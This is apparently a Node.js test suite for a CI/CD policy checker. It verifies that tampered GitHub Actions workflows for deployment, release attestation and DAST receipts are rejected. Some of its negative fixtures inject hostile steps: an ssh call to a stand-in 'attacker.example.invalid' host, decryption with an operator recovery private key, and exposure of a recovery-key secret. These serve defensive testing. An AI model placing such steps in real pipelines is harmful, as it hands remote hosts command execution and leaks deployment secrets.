#!/usr/bin/env node
import assert from "node:assert/strict";
import fs from "node:fs";
import {
  dastReceiptWiringMismatches,
  deploymentPrerequisiteMismatches,
  privilegedWorkflowMismatches,
  runEvidenceWorkflowMismatches,
  v1InstallOnlyWorkflowMismatches,
  v1LocalPrivateWorkflowMismatches,
} from "./privileged-workflow-policy.mjs";

const fixtures = [
  [".github/workflows/enterprise-infra.yml", "deploy-vps", false],
  [".github/workflows/enterprise-vps-evidence.yml", "vps-host-evidence", false],
  [".github/workflows/enterprise-live-evidence.yml", "production-live-evidence", false],
  [".github/workflows/release-attestation.yml", "github-sigstore-release-evidence", true],
  [".github/workflows/v1-install-only.yml", "install-v1", true],
  [".github/workflows/v1-local-private.yml", "activate-v1-local-private", true],
];

for (const [pathname, jobName, forbidTagTrigger] of fixtures) {
  const text = fs.readFileSync(pathname, "utf8");
  assert.deepEqual(privilegedWorkflowMismatches(text, { jobName, forbidTagTrigger }), []);
  assert.match(
    privilegedWorkflowMismatches(text.replaceAll("github.ref_protected == true", "true"), { jobName, forbidTagTrigger }).join(" "),
    /protected-main/,
  );
  assert.match(
    privilegedWorkflowMismatches(text.replaceAll("persist-credentials: false", "persist-credentials: true"), { jobName, forbidTagTrigger }).join(" "),
    /persisted credentials/,
  );
}

const release = fs.readFileSync(".github/workflows/release-attestation.yml", "utf8");
assert.match(
  privilegedWorkflowMismatches(`${release}\n  push:\n    tags: ['v*']\n`, { jobName: "github-sigstore-release-evidence", forbidTagTrigger: true }).join(" "),
  /tag triggers/,
);

const deployment = fs.readFileSync(".github/workflows/enterprise-infra.yml", "utf8");
const installOnly = fs.readFileSync(".github/workflows/v1-install-only.yml", "utf8");
const localPrivate = fs.readFileSync(".github/workflows/v1-local-private.yml", "utf8");
const runEvidence = fs.readFileSync(".github/workflows/enterprise-infra-run-evidence.yml", "utf8");
const infraOps = fs.readFileSync("scripts/infra-ops.mjs", "utf8");
assert.deepEqual(deploymentPrerequisiteMismatches(deployment), []);
assert.deepEqual(dastReceiptWiringMismatches(deployment), []);
assert.deepEqual(v1InstallOnlyWorkflowMismatches(installOnly), []);
assert.deepEqual(v1LocalPrivateWorkflowMismatches(localPrivate), []);
const qualityStart = deployment.indexOf("\n  quality:");
const controlCenterInstall = deployment.indexOf("working-directory: control-center", qualityStart);
const testingHygiene = deployment.indexOf("node ./scripts/infra-ops.mjs testing-hygiene", qualityStart);
const composeStart = deployment.indexOf("\n  compose:", qualityStart);
assert.ok(
  qualityStart >= 0
    && qualityStart < controlCenterInstall
    && controlCenterInstall < testingHygiene
    && testingHygiene < composeStart
    && deployment.indexOf("node ./scripts/infra-ops.mjs testing-hygiene", testingHygiene + 1) < 0,
  "enterprise quality must install Control Center dependencies before exactly one complete testing-hygiene invocation",
);
assert.match(runEvidence, /install -m 0600 \.env\.vps\.example \.env/);
assert.match(runEvidence, /test -z "\$\(git status --porcelain=v1 --untracked-files=all\)"/);
assert.match(runEvidence, /--envFile \.env(?:\s|\\)/);
assert.doesNotMatch(runEvidence, /--envFile \.env\.vps\.example/);
assert.deepEqual(runEvidenceWorkflowMismatches(runEvidence), []);
assert.match(
  runEvidenceWorkflowMismatches(runEvidence.replace(
    "releases/download/v5.3.1/docker-compose-linux-x86_64",
    "releases/download/v2.38.2/docker-compose-linux-x86_64",
  )).join(" "),
  /SHA-pinned Compose renderer/,
);
assert.match(
  runEvidenceWorkflowMismatches(runEvidence.replace(
    "f9ebc6ebdb19d769b793c245a736caaeb198c62587f13b25c660c13b4987f959",
    "0".repeat(64),
  )).join(" "),
  /SHA-pinned Compose renderer/,
);
assert.match(
  runEvidenceWorkflowMismatches(runEvidence.replace(
    "/srv/platform/provider-activation/inbox",
    "/tmp/provider-activation/inbox",
  )).join(" "),
  /exact deterministic non-secret Compose identity fixture/,
);
assert.match(
  runEvidenceWorkflowMismatches(runEvidence.replace("a".repeat(64), "invalid-receipt-digest")).join(" "),
  /exact deterministic non-secret Compose identity fixture/,
);
assert.match(
  runEvidenceWorkflowMismatches(runEvidence.replace(
    '            sed -i -E "/^${key}=/d" .env\n',
    "",
  )).join(" "),
  /exact deterministic non-secret Compose identity fixture|before clean-check and verification/,
);
assert.match(
  runEvidenceWorkflowMismatches(runEvidence.replace("          } >> .env", "          } > .env")).join(" "),
  /exact deterministic non-secret Compose identity fixture|before clean-check and verification/,
);
assert.match(
  runEvidenceWorkflowMismatches(runEvidence.replace(
    "            printf '%s\\n' 'DOCKER_ACTION_ACTIVATION_INBOX=/srv/platform/provider-activation/inbox'",
    "          } >> .env\n          printf '%s\\n' 'DOCKER_ACTION_ACTIVATION_INBOX=/srv/platform/provider-activation/inbox'\n          {",
  )).join(" "),
  /exact deterministic non-secret Compose identity fixture/,
);
assert.match(
  runEvidenceWorkflowMismatches(runEvidence.replace(
    "            printf 'ci-placeholder-%s-00000000000000000000000000000000\\n' \"$name\" > \"secrets/$name.txt\"\n",
    "",
  )).join(" "),
  /exact deterministic non-secret Compose identity fixture/,
);
assert.match(
  runEvidenceWorkflowMismatches(runEvidence
    .replace("          printf 'dummy-cert\\n' > traefik/certs/local-cert.pem\n", "")
    .replace("          printf 'dummy-key\\n' > traefik/certs/local-key.pem\n", "")).join(" "),
  /exact deterministic non-secret Compose identity fixture/,
);
assert.match(
  v1InstallOnlyWorkflowMismatches(installOnly.replace("github.ref_protected == true", "true")).join(" "),
  /protected-main/,
);
assert.match(
  v1InstallOnlyWorkflowMismatches(installOnly.replace("      group: infra-production-deploy", "      group: attacker-selected")).join(" "),
  /serialize/,
);
assert.match(
  v1InstallOnlyWorkflowMismatches(installOnly.replace("  contents: read", "  contents: write")).join(" "),
  /permissions/,
);
assert.match(
  v1InstallOnlyWorkflowMismatches(installOnly.replace("          python3 -m py_compile \\", "          sh ./scripts/deploy-v1-install-only.sh\n          python3 -m py_compile \\")).join(" "),
  /remote or deployment authority|bytes differ/,
);
assert.match(
  v1InstallOnlyWorkflowMismatches(installOnly.replace(
    "          python3 -m py_compile \\",
    "          python3 scripts/v1-node-runtime-prerequisite.py install\n          python3 -m py_compile \\",
  )).join(" "),
  /remote or deployment authority|bytes differ/,
);
assert.match(
  v1InstallOnlyWorkflowMismatches(`${installOnly}\n          sh ./scripts/deploy-v1-install-only.sh \\\n+            --controlArtifactReceiptFile "$control_receipt" \\\n+            --prepareReceiptFile "$prepare_receipt" \\\n+            --authorityFile "$authority" > "$receipt"\n`).join(" "),
  /remote or deployment authority|bytes differ/,
);
assert.match(
  v1InstallOnlyWorkflowMismatches(installOnly.replace(
    "      - name: Validate V1 source and receipt contracts without deployment authority",
    "      - name: Hidden remote command\n        run: /usr/bin/ssh attacker.example.invalid id\n      - name: Validate V1 source and receipt contracts without deployment authority",
  )).join(" "),
  /remote or deployment authority|exact-main controller/,
);
assert.match(
  v1InstallOnlyWorkflowMismatches(installOnly.replace(
    "      - name: Validate V1 source and receipt contracts without deployment authority",
    "      - name: Hidden recovery key\n        run: openssl cms -decrypt -inkey operator-recovery-private.pem\n      - name: Validate V1 source and receipt contracts without deployment authority",
  )).join(" "),
  /recovery private key|bytes differ/,
);
assert.match(
  v1LocalPrivateWorkflowMismatches(localPrivate.replace("github.ref_protected == true", "true")).join(" "),
  /protected-main/,
);
assert.match(
  v1LocalPrivateWorkflowMismatches(localPrivate.replace("      group: infra-production-deploy", "      group: attacker-selected")).join(" "),
  /serialize/,
);
assert.match(
  v1LocalPrivateWorkflowMismatches(localPrivate.replace("  contents: read", "  contents: write")).join(" "),
  /permissions/,
);
assert.match(
  v1LocalPrivateWorkflowMismatches(localPrivate.replace("          python3 -m py_compile \\", "          sh ./scripts/deploy-v1-local-private.sh\\n          python3 -m py_compile \\")).join(" "),
  /remote or cutover authority|bytes differ/,
);
assert.match(
  v1LocalPrivateWorkflowMismatches(`${localPrivate}\n          sh ./scripts/deploy-v1-local-private.sh \\\n            --authorityFile "$authority" > "$receipt"\n`).join(" "),
  /remote or cutover authority|bytes differ/,
);
assert.match(
  v1LocalPrivateWorkflowMismatches(localPrivate.replace(
    "      - name: Validate V1 cutover source contracts without local escrow authority",
    "      - name: Hidden remote command\n        run: /usr/bin/ssh attacker.example.invalid id\n      - name: Validate V1 cutover source contracts without local escrow authority",
  )).join(" "),
  /remote or cutover authority|bytes differ/,
);
assert.match(
  v1LocalPrivateWorkflowMismatches(localPrivate.replace(
    "      - name: Validate V1 cutover source contracts without local escrow authority",
    "      - name: Hidden recovery secret\n        env:\n          RECOVERY_PRIVATE_KEY: ${{ secrets.RECOVERY_PRIVATE_KEY }}\n        run: true\n      - name: Validate V1 cutover source contracts without local escrow authority",
  )).join(" "),
  /recovery private key|remote or cutover authority|bytes differ/,
);
assert.match(
  v1LocalPrivateWorkflowMismatches(localPrivate.replace(
    "    timeout-minutes: 30",
    ["    environment:", "      name: production", "    timeout-minutes: 30"].join("\n"),
  )).join(" "),
  /must not acquire the production environment|bytes differ/,
);
assert.match(
  v1LocalPrivateWorkflowMismatches(localPrivate.replace("STOP 78 LOCAL_OPERATOR_ESCROW_REQUIRED", "STOP 78 BYPASSED")).join(" "),
  /terminate exactly once|bytes differ/,
);
assert.match(deploymentPrerequisiteMismatches(deployment.replace("      - dast-zap\n", "")).join(" "), /exact .* prerequisite set/);
assert.match(
  deploymentPrerequisiteMismatches(deployment.replace("      - release-admission\n", "")).join(" "),
  /runtime verification and activation admission receipts/,
);
assert.match(
  deploymentPrerequisiteMismatches(deployment.replace(
    "    if: github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main' && github.ref_protected == true\n    permissions:",
    "    if: true\n    permissions:",
  )).join(" "),
  /protected-main manual release guard/,
);
assert.match(
  deploymentPrerequisiteMismatches(deployment.replace("    if: github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main' && github.ref_protected == true\n    environment:\n      name: production", "    if: ${{ always() }}\n    environment:\n      name: production")).join(" "),
  /fail\/skip propagation/,
);
assert.match(
  deploymentPrerequisiteMismatches(deployment.replace("      - name: Run ZAP baseline against staging", "    continue-on-error: true\n      - name: Run ZAP baseline against staging")).join(" "),
  /continue on error/,
);
assert.match(
  deploymentPrerequisiteMismatches(`${deployment}\n  alternate-deploy:\n    environment:\n      name: production\n    steps:\n      - run: sh ./scripts/deploy-vps.sh\n`).join(" "),
  /must not invoke .* directly|exactly one production environment/,
);
assert.match(
  deploymentPrerequisiteMismatches(deployment.replace('            "$OPS_IMAGE_ID" deploy-vps', '            "$OPS_IMAGE_ID" inspect')).join(" "),
  /exactly one trusted ops image/,
);
assert.match(
  deploymentPrerequisiteMismatches(deployment.replace("        run: |\n          ACTIVATION_RECEIPT=", "        run: sh ./scripts/deploy-vps.sh\n          ACTIVATION_RECEIPT=")).join(" "),
  /must not invoke .* directly/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replace(
    'STAGING_RECEIPT_SHA256="$(sha256sum "${staging_receipts[0]}"',
    'STAGING_RECEIPT_SHA256="caller-selected"',
  )).join(" "),
  /provider staging receipt/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replace("      - release-admission\n    if: github.event_name == 'workflow_dispatch' && github.ref", "    if: github.event_name == 'workflow_dispatch' && github.ref")).join(" "),
  /release admission dependency/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replace("--stagingReceipt \"$STAGING_RECEIPT\"", "--stagingReceipt /tmp/unbound.json")).join(" "),
  /staging receipt validation/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replace("--scanRequestOutput \"$DAST_SCAN_REQUEST\"", "--receiptOutput \"$DAST_RECEIPT\"")).join(" "),
  /independent provider authorization/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replaceAll("--dastReceipt \"$DAST_RECEIPT\"", "--dastReceipt /tmp/unbound.json")).join(" "),
  /independent provider authorization|cryptographically revalidate/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replaceAll("DAST_RECEIPT_SHA256: ${{ needs.dast-zap.outputs.dast_receipt_sha256 }}", "DAST_RECEIPT_SHA256: deadbeef")).join(" "),
  /cryptographically revalidate/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replace("test \"$DAST_TARGET\" = \"$CANONICAL_TARGET\"", "true")).join(" "),
  /canonical target/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replace("inputs[dast_report_artifact_sha256]=${DAST_REPORT_ARTIFACT_SHA256}", "inputs[dast_report_artifact_sha256]=caller-selected")).join(" "),
  /independent provider authorization/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replace("--reportArtifactSha256 \"$DAST_REPORT_ARTIFACT_SHA256\"", "--reportArtifactSha256 deadbeef")).join(" "),
  /independent provider authorization|cryptographically revalidate/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replace("--dastAttestationBundle \"$DAST_BUNDLE\"", "--dastAttestationBundle /tmp/unbound.bundle")).join(" "),
  /independent provider authorization/,
);
assert.match(
  deploymentPrerequisiteMismatches(deployment.replace("platform-activation-receipt/v3", "platform-activation-receipt/v2")).join(" "),
  /receipt v3/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replace('--dockerActivationEnvelope "$PROMOTED/docker-runtime-activation.dsse.json"', "--legacyBundle /tmp/activation.bundle")).join(" "),
  /seven-file activation promotion v2/,
);
assert.match(
  dastReceiptWiringMismatches(deployment.replace(
    '            -v "$DEPLOY_DAST_PROVIDER_RECEIPT_PATH:/run/platform-deploy/dast-provider-verification.json:ro"',
    '            -v "$DEPLOY_DAST_PROVIDER_RECEIPT_PATH:/run/platform-deploy/dast-provider-verification.json:ro" \\\n            -v "$DAST_PROVIDER_METADATA:/run/platform-deploy/dast-provider-run.json:ro"',
  )).join(" "),
  /closed receipt, authorization and manifest/,
);

const releasePolicyStep = deployment.match(
  /      - name: Release artifact and admission policy tests\n[\s\S]*?(?=\n      - name: Upload supply-chain evidence reports)/,
)?.[0] ?? "";
for (const command of [
  "node --test scripts/hosted-preparation-provider-conformance.test.mjs",
  "node scripts/dast-deploy-sink.test.mjs",
  "node scripts/t16-policy.mjs",
  "sh scripts/cloudflare-origin-lock-ufw-test.sh",
]) {
  assert.equal(
    releasePolicyStep.split(command).length - 1,
    1,
    `${command} must appear exactly once in the offline Release policy step`,
  );
}

const expectedBrownfieldOfflineStep = [
  "      - name: V1 brownfield offline preservation tests",
  "        timeout-minutes: 10",
  "        run: |",
  "          node --test --test-concurrency=1 \\",
  "            scripts/live-preservation-baseline.test.mjs \\",
  "            scripts/v1-predeploy-backup-receipt.test.mjs \\",
  "            scripts/v1-provider-gates.test.mjs \\",
  "            scripts/v1-phase-a-authorization.test.mjs \\",
  "            scripts/v1-brownfield-bootstrap.test.mjs \\",
  "            scripts/v1-brownfield-bootstrap-bridge.test.mjs \\",
  "            scripts/v1-node-runtime-prerequisite.test.mjs \\",
  "            scripts/v1-brownfield-admission.test.mjs \\",
  "            scripts/v1-brownfield-install-consumer.test.mjs \\",
  "            scripts/v1-install-package.test.mjs \\",
  "            scripts/v1-phase-b-preinstall-authorization.test.mjs \\",
  "            scripts/v1-phase-b-replay-artifacts.test.mjs \\",
  "            scripts/v1-brownfield-runtime-identity.test.mjs \\",
  "            scripts/v1-brownfield-application-data-cutover.test.mjs \\",
  "            scripts/v1-brownfield-scheduler-cutover.test.mjs \\",
  "            scripts/v1-brownfield-control-plane-policy.test.mjs \\",
  "            scripts/v1-brownfield-control-plane-gate.test.mjs \\",
  "            scripts/v1-local-private-control.test.mjs \\",
  "            scripts/v1-local-private-control.e2e.test.mjs \\",
  "            scripts/v1-local-private-runtime-semantics-contract.test.mjs \\",
  "            scripts/v1-local-private-validation-lane.test.mjs \\",
  "            scripts/v1-local-private-evidence-producer.test.mjs \\",
  "            scripts/v1-local-private-reconcile.test.mjs \\",
  "            scripts/v1-local-private-reconcile-journal-contract.test.mjs \\",
  "            scripts/deploy-v1-local-private.test.mjs \\",
  "            scripts/hosted-workload-preservation-guard.test.mjs",
].join("\n");
const brownfieldOfflineStep = deployment.match(
  /      - name: V1 brownfield offline preservation tests\n[\s\S]*?(?=\n      - name:)/,
)?.[0] ?? "";
assert.equal(
  brownfieldOfflineStep,
  expectedBrownfieldOfflineStep,
  "the V1 brownfield preservation suite must use the exact serial offline invocation",
);
assert.equal(
  deployment.split("node --test --test-concurrency=1").length - 1,
  1,
  "the exact V1 brownfield serial invocation must appear once",
);
for (const command of [
  "scripts/v1-brownfield-application-data-cutover.test.mjs",
  "scripts/v1-brownfield-bootstrap-bridge.test.mjs",
  "scripts/v1-node-runtime-prerequisite.test.mjs",
  "scripts/v1-local-private-control.test.mjs",
  "scripts/v1-local-private-control.e2e.test.mjs",
  "scripts/v1-local-private-runtime-semantics-contract.test.mjs",
  "scripts/v1-local-private-validation-lane.test.mjs",
  "scripts/v1-local-private-evidence-producer.test.mjs",
  "scripts/v1-local-private-reconcile.test.mjs",
  "scripts/v1-local-private-reconcile-journal-contract.test.mjs",
  "scripts/deploy-v1-local-private.test.mjs",
]) {
  assert.equal(
    deployment.split(command).length - 1,
    1,
    `${command} must appear exactly once in the offline V1 brownfield step`,
  );
}
const supplyChainJobIndex = deployment.indexOf("\n  supply-chain:");
const releasePolicyIndex = deployment.indexOf(
  "      - name: Release artifact and admission policy tests",
  supplyChainJobIndex,
);
const brownfieldOfflineIndex = deployment.indexOf(expectedBrownfieldOfflineStep, supplyChainJobIndex);
const uploadSupplyChainIndex = deployment.indexOf(
  "      - name: Upload supply-chain evidence reports",
  supplyChainJobIndex,
);
const enterpriseReadinessIndex = deployment.indexOf("\n  enterprise-readiness:", supplyChainJobIndex);
assert.ok(
  supplyChainJobIndex >= 0
    && supplyChainJobIndex < releasePolicyIndex
    && releasePolicyIndex < brownfieldOfflineIndex
    && brownfieldOfflineIndex < uploadSupplyChainIndex
    && uploadSupplyChainIndex < enterpriseReadinessIndex,
  "the exact V1 brownfield serial suite must stay inside supply-chain after release policy and before evidence upload",
);

const expectedBrownfieldDeploymentStop = [
  "      - name: Block production until authoritative V1 brownfield admission exists",
  "        run: |",
  "          echo \"::error::STOP: authoritative V1 brownfield admission is not implemented; canonical COMPLETE baseline, immutable/CAS PRE-DEPLOY backup, exact candidate commit/tree and target root, and provider+target authorization are required.\"",
  "          echo \"::error::Local REBUILD_BACKUP_VERIFIED_NON_AUTHORITATIVE with mutationAuthority=false is deny-only.\"",
  "          node ./scripts/v1-brownfield-control-plane-gate.mjs apply",
  "          exit 78",
].join("\n");
const brownfieldDeploymentStop = deployment.match(
  /      - name: Block production until authoritative V1 brownfield admission exists\n[\s\S]*?(?=\n      - name:)/,
)?.[0] ?? "";
assert.equal(
  brownfieldDeploymentStop,
  expectedBrownfieldDeploymentStop,
  "full production activation must retain the exact terminal V1 brownfield stop",
);
assert.equal(
  deployment.split("node ./scripts/v1-brownfield-control-plane-gate.mjs apply").length - 1,
  1,
  "the deny-only V1 brownfield apply reference must be invoked exactly once",
);
const checkoutIndex = deployment.indexOf("      - uses: actions/checkout@", deployment.indexOf("  deploy-vps:"));
const brownfieldStopIndex = deployment.indexOf(expectedBrownfieldDeploymentStop);
const firstHandoffIndex = deployment.indexOf(
  "      - name: Download exact admitted deployment receipts",
  deployment.indexOf("  deploy-vps:"),
);
const installSshIndex = deployment.indexOf("      - name: Install SSH key", deployment.indexOf("  deploy-vps:"));
const opsImageIndex = deployment.indexOf('          docker pull "$OPS_IMAGE"', deployment.indexOf("  deploy-vps:"));
assert.ok(
  checkoutIndex >= 0
    && checkoutIndex < brownfieldStopIndex
    && brownfieldStopIndex < firstHandoffIndex
    && firstHandoffIndex < installSshIndex,
  "the full-activation V1 stop must precede deployment handoffs and SSH material",
);
assert.ok(
  brownfieldStopIndex < opsImageIndex,
  "the full-activation V1 stop must precede every ops-image deployment sink",
);

const brokerInvocation = infraOps.match(
  /const dockerActionBrokerTestFiles = \[([\s\S]*?)\];[\s\S]*?run\(process\.execPath, \[\n\s+"--test",\n\s+"--test-concurrency=1",\n\s+\.\.\.dockerActionBrokerTestFiles,\n\s+\], \{ cwd: infraRoot \}\);/,
);
assert.ok(brokerInvocation, "testing-hygiene must run the complete broker suite serially");
assert.deepEqual(
  [...brokerInvocation[1].matchAll(/"([^"]+\.test\.mjs)"/g)].map((match) => match[1]),
  [
    "scripts/docker-action-contract.test.mjs",
    "scripts/docker-action-broker.test.mjs",
    "scripts/docker-action-client.test.mjs",
    "scripts/docker-action-worker.test.mjs",
    "scripts/docker-action-broker.boundary.test.mjs",
    "scripts/docker-action-helper-plan.test.mjs",
    "scripts/docker-action-v2-fixtures.test.mjs",
    "scripts/docker-action-activation.test.mjs",
  ],
);
assert.match(
  infraOps,
  /return \["tests", "state", "status"\]\.flatMap\(\(directory\) =>/,
  "Control Center hygiene must include package-owned tests, state, and status suites",
);
for (const firstConfigurationTest of [
  "control-center/tests/first-configuration.test.mjs",
  "control-center/tests/first-configuration-keycloak.test.mjs",
]) {
  assert.equal(fs.existsSync(firstConfigurationTest), true, `${firstConfigurationTest} must remain in the enumerated Control Center suite`);
}
for (const v1Test of [
  "scripts/keycloak-passkey-reconcile.test.mjs",
  "scripts/v1-local-private-evidence-producer.test.mjs",
  "scripts/v1-local-private-reconcile.test.mjs",
]) {
  assert.match(
    infraOps,
    new RegExp(`run\\(process\\.execPath, \\["--test", "${v1Test.replaceAll(".", "\\.")}"\\]`),
    `${v1Test} must be wired into testing-hygiene`,
  );
}
assert.match(
  infraOps,
  /"--test",\s*\n\s*"scripts\/v1-brownfield-bootstrap-bridge\.test\.mjs",/,
  "the real bootstrap transport fixture must be wired into testing-hygiene",
);
assert.match(
  infraOps,
  /"scripts\/v1-brownfield-bootstrap-bridge\.test\.mjs",\s*\n\s*"scripts\/v1-node-runtime-prerequisite\.test\.mjs",/,
  "the fixed Node runtime prerequisite fixture must be wired after the bootstrap transport fixture",
);

const total = fixtures.length * 3 + 1 + 78;
process.stdout.write(`privileged workflow policy tests passed ${total}/${total}\n`);
